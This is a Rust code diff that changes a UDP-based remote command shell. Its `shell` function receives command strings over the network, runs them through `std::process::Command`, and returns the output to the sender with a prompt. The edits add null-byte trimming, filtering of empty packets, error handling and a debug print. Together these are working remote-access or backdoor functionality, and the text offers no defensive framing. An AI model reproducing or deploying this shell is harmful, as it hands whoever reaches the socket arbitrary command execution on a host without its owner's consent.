@@ -7,6 +7,7 @@ use std::process::Command;
 use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
 use std::format;
+use std::ptr::null;
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use std::thread;
@@ -287,10 +288,14 @@ pub fn shell(sock: &mut UdpSocket) {
             Ok((b, s)) => (b, s),
             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
         };
-        if bytes != 0 {
+        //Changed to include 1 because there was a bunch 
+        //being sent that didnt have anything
+        if bytes != 0 && bytes != 1{
             let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
             let cmd_out = format!("{}{}", execute_cmd(cmd), "\n>> ");
             sock.send_to(cmd_out.as_bytes(), src);
+            
+            
         }
     }
 }
@@ -310,14 +315,28 @@ pub fn execute_cmd(s: String) -> String {
                     Ok(k) => todo!(),
                 }
             },
+            "nul" => {
+                return head.to_string();
+            }
             head => {
-                let cmd = Command::new(head).args(tail).output().unwrap();
-                return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
+                //Printing for testing purposes
+                println!("{:?}", head);
+                let cmd = Command::new(head).args(tail).output();
+                match cmd{
+                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
+                    Err(e) => return format!("{}", e),
+                }
             },
         }
     }
     else {
-        let tmp = s.trim();
+        //Trim initial string
+        let mut tmp = s.trim();
+        //Trim all null bytes
+        tmp = tmp.trim_matches('\0');
+        //Trim remaining whitespace
+        tmp = tmp.trim();
+
         match tmp {
             "exit" => return String::new(),
             tmp => {
